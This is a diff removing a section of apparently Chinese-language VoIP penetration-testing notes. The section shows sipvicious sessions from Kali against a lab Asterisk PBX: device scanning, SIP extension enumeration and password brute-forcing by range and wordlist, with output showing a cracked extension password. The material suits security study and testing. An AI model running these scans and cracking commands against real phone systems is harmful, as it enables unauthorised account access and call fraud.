@@ -38,33 +38,3 @@
 	http://www.ehacking.net/2012/06/voip-sniffing-cracking-phishing.html
 
 	http://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP
-
-### sipvicious 工具集
-
-	root@kali:~# svmap 172.16.8.181
-	| SIP Device        | User Agent           | Fingerprint |
-	----------------------------------------------------------
-	| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
-
-	root@kali:~# svwar -e 18101-18105 172.16.8.181 -m INVITE
-	| Extension | Authentication |
-	------------------------------
-	| 18101     | reqauth        |
-
-	root@kali:~# svcrack -u 18101 172.16.8.181
-	| Extension | Password |
-	------------------------
-	| 18101     | 18101    |
-
-	root@kali:~# svcrack -u 18101 -r 18101-18105 172.16.8.181
-	| Extension | Password |
-	------------------------
-	| 18101     | 18101    |
-
-	root@kali:~# cat pass.txt 
-	18101
-	18102
-	root@kali:~# svcrack -u 18101 -d pass.txt 172.16.8.181
-	| Extension | Password |
-	------------------------
-	| 18101     | 18101    |
